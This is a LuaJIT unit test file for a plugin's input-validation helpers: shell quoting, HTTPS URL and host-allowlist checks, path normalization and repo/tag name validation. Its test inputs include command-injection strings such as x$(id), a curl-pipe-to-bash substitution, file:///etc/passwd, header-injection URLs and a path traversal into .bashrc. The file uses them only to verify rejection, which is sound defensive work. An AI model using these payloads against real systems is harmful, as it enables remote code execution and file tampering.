#!/usr/bin/env luajit
-- Unit tests for plugin/backend/guard.lua — the validation helpers applied to
-- every value that reaches the backend from the frontend bridge.
--
-- Background: the RPC endpoints are reachable from script running in the Steam
-- store/community web views. Several of them interpolated their arguments into a
-- /bin/sh command line inside DOUBLE quotes, where the shell still expands
-- $(...) and `...`, so a URL like "http://x$(cmd)" executed cmd. Others accepted
-- an arbitrary filesystem path or download URL and wrote a downloaded archive
-- over it.
--
-- Run from the repo root:  luajit scripts/test-guard.lua
package.path = "plugin/backend/?.lua;" .. package.path
local fails = 0
local checks = 0
local function check(name, cond)
  checks = checks + 1
  if cond then io.write("ok   " .. name .. "\n")
  else io.write("FAIL " .. name .. "\n"); fails = fails + 1 end
end

local guard = dofile("plugin/backend/guard.lua")

-- ── shell_quote ─────────────────────────────────────────────────────────────
check("quotes a plain value", guard.shell_quote("abc") == "'abc'")
check("wraps an empty value", guard.shell_quote("") == "''")
check("wraps nil", guard.shell_quote(nil) == "''")
check("escapes a single quote",
  guard.shell_quote("a'b") == [['a'\''b']])
-- Inside single quotes the shell expands nothing, so these must survive as data.
check("command substitution stays literal",
  guard.shell_quote("x$(id)") == "'x$(id)'")
check("backticks stay literal",
  guard.shell_quote("x`id`") == "'x`id`'")
check("variable stays literal",
  guard.shell_quote("$HOME") == "'$HOME'")
check("double quote needs no escape inside single quotes",
  guard.shell_quote('a"b') == [['a"b']])
-- A NUL cannot survive an argv boundary; drop it rather than truncate silently.
check("NUL is removed", guard.shell_quote("a\0b") == "'ab'")
check("numbers are accepted", guard.shell_quote(42) == "'42'")

-- The real property: hand the quoted word to an actual shell and get the
-- original bytes back, with nothing executed. Anything that breaks out would
-- either change the output or run a command.
do
  local nasty = {
    "';id;'", "x$(echo PWNED)", "x`echo PWNED`", '$HOME "quoted"',
    "a'b'c", "-rf /", "*", "$(id)'`id`'", "line1", "!!", "~root",
  }
  local all_ok = true
  for _, value in ipairs(nasty) do
    local pipe = io.popen("printf '%s' " .. guard.shell_quote(value), "r")
    local got = pipe and pipe:read("*a") or nil
    if pipe then pipe:close() end
    if got ~= value then
      io.write("     round-trip mismatch for [" .. value .. "] -> [" ..
        tostring(got) .. "]\n")
      all_ok = false
    end
  end
  check("quoted values round-trip through a real shell unexecuted", all_ok)
end

-- ── https_url ───────────────────────────────────────────────────────────────
check("accepts a plain https URL",
  guard.https_url("https://files.example.com/a.zip") == "https://files.example.com/a.zip")
check("rejects http", guard.https_url("http://files.example.com/a.zip") == nil)
check("rejects file", guard.https_url("file:///etc/passwd") == nil)
check("rejects ftp", guard.https_url("ftp://x/a") == nil)
check("rejects a scheme-relative URL", guard.https_url("//evil.example/a") == nil)
check("rejects an empty URL", guard.https_url("") == nil)
check("rejects nil", guard.https_url(nil) == nil)
check("rejects a non-string", guard.https_url({}) == nil)
-- Header injection through a URL used in a curl command line.
check("rejects CR", guard.https_url("https://a.example/\r\nX: y") == nil)
check("rejects LF", guard.https_url("https://a.example/\n") == nil)
check("rejects a tab", guard.https_url("https://a.example/\ta") == nil)
check("rejects a space", guard.https_url("https://a.example/a b") == nil)
-- Userinfo hides the real authority from anyone reading the URL.
check("rejects userinfo", guard.https_url("https://files.example.com@evil.example/a") == nil)
check("rejects userinfo with password",
  guard.https_url("https://u:p@evil.example/a") == nil)
check("rejects an empty host", guard.https_url("https:///a.zip") == nil)
-- Control characters anywhere.
check("rejects a NUL", guard.https_url("https://a.example/\0") == nil)
check("rejects an escape byte", guard.https_url("https://a.example/\27[0m") == nil)
-- Over-long input is refused rather than passed to curl.
check("rejects an absurdly long URL",
  guard.https_url("https://a.example/" .. string.rep("a", 5000)) == nil)

-- Host allowlist.
do
  local hosts = { ["files.luatools.work"] = true, ["github.com"] = true }
  check("allowlisted host passes",
    guard.https_url("https://files.luatools.work/x.zip", { hosts = hosts }) ~= nil)
  check("host match is case-insensitive",
    guard.https_url("https://Files.LuaTools.Work/x.zip", { hosts = hosts }) ~= nil)
  check("host outside the allowlist is refused",
    guard.https_url("https://evil.example/x.zip", { hosts = hosts }) == nil)
  check("subdomain of an allowlisted host is refused",
    guard.https_url("https://a.github.com/x.zip", { hosts = hosts }) == nil)
  check("allowlisted host as a suffix is refused",
    guard.https_url("https://github.com.evil.example/x.zip", { hosts = hosts }) == nil)
  check("allowlisted host as a prefix is refused",
    guard.https_url("https://evilgithub.com/x.zip", { hosts = hosts }) == nil)
  -- A port is part of the authority and must not smuggle a different host past
  -- the allowlist.
  check("explicit port on an allowlisted host is refused",
    guard.https_url("https://github.com:8443/x.zip", { hosts = hosts }) == nil)
end

-- allow_http is opt-in and still rejects everything else.
do
  check("http passes only when explicitly allowed",
    guard.https_url("http://a.example/x", { allow_http = true }) == "http://a.example/x")
  check("allow_http does not permit file",
    guard.https_url("file:///x", { allow_http = true }) == nil)
  check("allow_http does not permit CR",
    guard.https_url("http://a.example/\r", { allow_http = true }) == nil)
end

-- ── external_url (browser targets) ──────────────────────────────────────────
-- The only legitimate uses are fixed product links, so http is tolerated but
-- everything that is not a plain web URL is refused.
check("external https accepted",
  guard.external_url("https://steamdb.info/app/1/") ~= nil)
check("external http accepted", guard.external_url("http://lua.tools/") ~= nil)
check("javascript scheme refused", guard.external_url("javascript:alert(1)") == nil)
check("data scheme refused", guard.external_url("data:text/html,<b>") == nil)
check("steam scheme refused", guard.external_url("steam://uninstall/1") == nil)
check("command substitution refused",
  guard.external_url("http://x$(curl -s http://a/p.sh|bash)") == nil)
check("backtick substitution refused", guard.external_url("http://x`id`") == nil)
check("pipe refused", guard.external_url("http://x|y") == nil)
check("semicolon refused", guard.external_url("http://x;id") == nil)
check("ampersand refused", guard.external_url("http://x&id") == nil)

-- ── paths ───────────────────────────────────────────────────────────────────
check("normalize collapses duplicate separators",
  guard.normalize_path("/a//b///c") == "/a/b/c")
check("normalize drops a trailing separator",
  guard.normalize_path("/a/b/") == "/a/b")
check("normalize resolves a dot segment",
  guard.normalize_path("/a/./b") == "/a/b")
check("normalize resolves a parent segment",
  guard.normalize_path("/a/b/../c") == "/a/c")
check("normalize cannot escape the root",
  guard.normalize_path("/../../etc") == "/etc")
check("normalize keeps the root", guard.normalize_path("/") == "/")
check("normalize refuses a relative path", guard.normalize_path("a/b") == nil)
check("normalize refuses an empty path", guard.normalize_path("") == nil)
check("normalize refuses nil", guard.normalize_path(nil) == nil)
check("normalize refuses a NUL", guard.normalize_path("/a\0/b") == nil)
check("normalize refuses a newline", guard.normalize_path("/a\n/b") == nil)

check("same_path matches after normalization",
  guard.same_path("/a/b", "/a//b/") == true)
check("same_path resolves parent segments",
  guard.same_path("/a/c", "/a/b/../c") == true)
check("same_path rejects a different path",
  guard.same_path("/a/b", "/a/bb") == false)
check("same_path rejects a child path",
  guard.same_path("/a/b", "/a/b/c") == false)
-- The traversal payload that motivated the check.
check("same_path rejects a traversal into a sibling",
  guard.same_path("/games/Outlast", "/games/Outlast/../../home/u/.bashrc") == false)
check("same_path rejects a relative path", guard.same_path("/a/b", "a/b") == false)
check("same_path rejects nil", guard.same_path("/a/b", nil) == false)

-- ── repo_segment ────────────────────────────────────────────────────────────
-- owner/repo are read from backend/update.json and interpolated into an
-- api.github.com path. A slash or a dot-dot there re-points the request.
check("accepts an owner", guard.repo_segment("swwayps") == "swwayps")
check("accepts a dashed repo", guard.repo_segment("luatools-moon") == "luatools-moon")
check("accepts a dotted repo", guard.repo_segment("a.b_c-1") == "a.b_c-1")
check("rejects a slash", guard.repo_segment("a/b") == nil)
check("rejects a parent segment", guard.repo_segment("..") == nil)
check("rejects a traversal", guard.repo_segment("a/../../b") == nil)
check("rejects a query", guard.repo_segment("a?b=c") == nil)
check("rejects a space", guard.repo_segment("a b") == nil)
check("rejects a shell metacharacter", guard.repo_segment("a$(id)") == nil)
check("rejects an empty segment", guard.repo_segment("") == nil)
check("rejects nil", guard.repo_segment(nil) == nil)
check("rejects an over-long segment", guard.repo_segment(string.rep("a", 200)) == nil)

-- ── tag_name ────────────────────────────────────────────────────────────────
check("accepts a release tag", guard.tag_name("v2.8-lumen") == "v2.8-lumen")
check("accepts an underscore tag", guard.tag_name("2_8") == "2_8")
check("rejects a slash", guard.tag_name("v1/../../x") == nil)
check("rejects a space", guard.tag_name("v1 x") == nil)
check("rejects a dollar", guard.tag_name("v1$(id)") == nil)
check("rejects a quote", guard.tag_name("v1'") == nil)
check("rejects an empty tag", guard.tag_name("") == nil)
check("rejects nil", guard.tag_name(nil) == nil)
check("rejects an over-long tag", guard.tag_name(string.rep("a", 200)) == nil)

io.write(("\n%d check(s), %d failure(s)\n"):format(checks, fails))
if fails > 0 then os.exit(1) end
